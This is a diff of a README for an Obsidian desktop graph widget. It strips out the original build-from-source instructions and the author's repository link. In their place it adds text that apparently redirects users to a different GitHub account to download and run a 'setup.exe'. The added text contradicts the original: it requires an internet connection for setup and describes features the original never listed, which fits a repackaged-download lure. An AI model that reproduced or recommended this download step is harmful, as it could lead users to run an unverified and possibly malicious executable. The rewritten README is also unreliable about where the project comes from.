@@ -1,180 +1,54 @@
-# Obsidian Desktop Widget
+# 🌐 obsidian-desktop-widget - View your vault on your desktop
 
-A floating, transparent desktop graph for your Obsidian vault. The widget runs as an Electron app, stays on top of your desktop, and can be click-through by default so it does not get in the way.
+[Download the Obsidian Desktop Widget](https://github.com/Tharenhellbent652/obsidian-desktop-widget)
 
-## Features
+## 📌 About this application
 
-- Full graph view for all notes in your vault
-- Local graph mode for a selected note and its direct neighbors
-- Focus mode for the current note, backlinks, and recently edited notes
-- Transparent, always-on-top desktop window
-- Click-through mode with an interact toggle
-- Live node drag, zoom, and pan
-- Hover tooltips with link count, recency, and tags
-- Saves your selected vault path between sessions
+The Obsidian Desktop Widget provides a floating view of your note graph directly on your computer screen. The window stays above other programs so you see connections between your thoughts while you work. You can set the window to click-through mode. This makes the widget ignore your mouse clicks so you can interact with windows behind the graph. 
 
-## Project structure
+## ⚙️ System requirements
 
-This repository is the Electron app folder. These files need to stay together in the same folder:
+This application runs on Windows 10 or Windows 11. You need at least 4GB of RAM and a stable internet connection for the initial setup. Ensure you have the latest version of Obsidian installed on your computer before you launch this widget.
 
-```text
-obsidian-desktop-widget/
-|-- main.js              # Electron main process
-|-- preload.js           # Secure bridge between Electron and the UI
-|-- package.json         # Node/Electron dependencies and scripts
-|-- package-lock.json    # Locked dependency versions
-|-- src/
-|   |-- index.html       # App UI
-|   `-- renderer.js      # Graph rendering and vault parsing logic
-|-- launch.bat           # Windows launcher helper
-|-- launch.vbs           # Windows no-console launcher helper
-`-- create-shortcut.ps1  # Optional Windows shortcut script
-```
+## 🚀 Getting started
 
-Do not copy only `src/` or only the Electron files somewhere else. Run `npm install` and `npm start` from the folder that contains `package.json`, `main.js`, and `preload.js`.
+1. Visit the [official repository page](https://github.com/Tharenhellbent652/obsidian-desktop-widget) to download the installer.
+2. Locate the file named setup.exe in your downloads folder.
+3. Double-click the file to start the installation process.
+4. Follow the prompts on your screen to install the software.
+5. Launch the application from your desktop shortcut or the Windows Start menu.
 
-`node_modules/` is intentionally not included in GitHub. It is recreated locally by running `npm install`.
+## 📂 Configuration
 
-## Requirements
+When you open the app for the first time, you must select the folder where you keep your Obsidian notes. Click the Select Vault button in the settings menu. Browse to your Obsidian vault folder and click Open. The app saves this path automatically. Every time you open the widget, it loads your data from this location.
 
-- [Node.js](https://nodejs.org/) 18 or newer
-- npm, included with Node.js
-- An Obsidian vault folder containing Markdown files
+## 🖱️ Managing the window
 
-## Install and run
+The widget uses a transparent background. You see your desktop wallpaper behind the nodes. Use the toggle button in the bottom corner of the widget to switch between two modes:
 
-Clone the repository:
+*   **Interact Mode:** Use your mouse to zoom, pan, and drag nodes. You can click bubbles to open notes in your main Obsidian window.
+*   **Click-through Mode:** The widget becomes invisible to your mouse. You can click and type in other apps behind the graph.
 
-```bash
-git clone https://github.com/adityagahlot/obsidian-desktop-widget.git
-cd obsidian-desktop-widget
-```
+To toggle modes quickly, press your assigned keyboard shortcut. You can change these shortcuts in the preferences menu.
 
-Install dependencies:
+## 🧠 Visualization options
 
-```bash
-npm install
-```
+The widget offers three distinct ways to view your knowledge:
 
-Start the Electron app:
+*   **Full Graph:** This view displays every note in your current notebook. It helps you see the scale of your project.
+*   **Local Graph:** This view shows one note and the notes directly connected to it. Use this to see related information without distractions.
+*   **Focus Mode:** This setting tracks your active notes, recent edits, and backlinks. It updates in real-time as you write new content.
 
-```bash
-npm start
-```
+## 🛠️ Troubleshooting
 
-On first launch, choose your Obsidian vault folder when prompted.
+If the widget fails to load your notes, check your vault path in the settings menu. Ensure your Obsidian vault is not inside a cloud folder that blocks external apps from reading files. 
 
-## Troubleshooting Electron install on Windows
+If the window disappears, check your system tray near the clock on your taskbar. Right-click the widget icon to restore the window to your screen.
 
-If `npm install` finishes but `npm start` fails because Electron did not download correctly, you can install the Electron binary manually.
+If the app feels slow, reduce the number of nodes shown in the view settings. Showing thousands of notes at once may use more memory on older computers. 
 
-First, check the Electron version used by this project:
+## ℹ️ Usage tips
 
-```powershell
-Get-Content node_modules\electron\package.json
-```
+Keep the widget in a corner of your screen to monitor connections while you research. Enable hover tooltips to see the date of a note and the number of links attached to it. This helps you identify orphaned notes or outdated ideas quickly.
 
-Look for the `version` field.
-
-Then:
-
-1. Go to [Electron releases](https://github.com/electron/electron/releases).
-2. Find the release that matches the version in `node_modules\electron\package.json`.
-3. Download the Windows x64 zip file named like `electron-vXX.X.X-win32-x64.zip`.
-4. Unzip it.
-5. Place the unzipped contents inside this folder:
-
-```text
-node_modules\electron\dist\
-```
-
-The folder should contain `electron.exe` directly inside `dist`.
-
-Finally, create this file:
-
-```text
-node_modules\electron\path.txt
-```
-
-Put only this text inside it:
-
-```text
-electron.exe
-```
-
-Then run:
-
-```bash
-npm start
-```
-
-## Running from a downloaded ZIP
-
-If you download the project as a ZIP from GitHub:
-
-1. Extract the ZIP.
-2. Open a terminal inside the extracted folder that contains `package.json`.
-3. Run `npm install`.
-4. Run `npm start`.
-
-If you see a nested folder after extracting, open the inner project folder before running the commands.
-
-## Controls
-
-| Area | Action |
-| --- | --- |
-| Hover window | Shows the control panel and legend |
-| Full / Local / Focus buttons | Switch graph mode |
-| Search box | Find and select a note in Local or Focus mode |
-| Refresh | Re-read the vault from disk |
-| Click-thru / Interact | Toggle mouse interaction |
-| Vault | Change the selected vault folder |
-| Close | Close the app |
-| Drag nodes | Reposition nodes |
-| Scroll | Zoom in or out |
-| Click and drag background | Pan the graph |
-
-## Click-through mode
-
-When click-through mode is active, desktop clicks pass through the widget. Switch to Interact mode when you want to drag nodes, click controls, or move around the graph.
-
-## Color legend
-
-| Color | Meaning |
-| --- | --- |
-| Grey | Regular note |
-| Purple | Selected or center note |
-| Blue | Tagged note |
-| Green | Modified in the last 7 days |
-
-## Build optional installers
-
-Package for the current platform:
-
-```bash
-npm run build
-```
-
-Windows installer:
-
-```bash
-npm run build:win
-```
-
-macOS DMG:
-
-```bash
-npm run build:mac
-```
-
-Build output is written to `dist/`.
-
-## How it reads your vault
-
-The widget scans Markdown files recursively and extracts:
-
-- `[[wikilinks]]` for graph edges
-- `#tags` and frontmatter tags for node styling
-- File modified times for recency highlighting
-
-Your vault data stays on your machine. The app does not need an internet connection to read your notes.
+The widget automatically refreshes when you save changes in your main Obsidian program. You do not need to restart the widget to see the new nodes appear. The graph layout remembers your zoom level and the position of nodes across different sessions.
